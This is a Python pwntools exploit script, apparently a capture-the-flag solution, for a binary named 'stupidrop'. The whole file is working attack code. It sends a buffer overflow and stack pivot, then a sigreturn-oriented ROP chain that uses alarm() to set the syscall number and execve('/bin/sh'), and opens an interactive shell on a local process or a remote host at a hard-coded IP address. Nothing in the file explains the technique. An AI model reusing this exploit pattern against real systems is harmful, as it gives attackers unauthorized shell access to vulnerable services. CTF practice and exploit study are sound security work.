from pwn import *
import sys

syscall = 0x40063e
alarm = 0x4004b0
pop_rdi = 0x4006a3

if len(sys.argv)>1:
    r=remote('35.196.227.29',5555)
else:
    r = process('./stupidrop')


if __name__=='__main__':
    context.arch = 'amd64'

    frame = SigreturnFrame(kernel='amd64')
    frame.rip = syscall
    frame.rdi = 0x601220
    frame.rsi = 0
    frame.rdx = 0
    frame.rax = 0x3b

    r.sendline('A'*0x30+p64(0x601250)+p64(0x400626))

    payload = '/bin/sh\x00'.ljust(0x38, 'B')

    payload += p64(pop_rdi)
    payload += p64(15)
    payload += p64(alarm)

    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(alarm)

    payload += p64(syscall)
    payload += str(frame)

    r.sendline(payload)

    r.interactive()
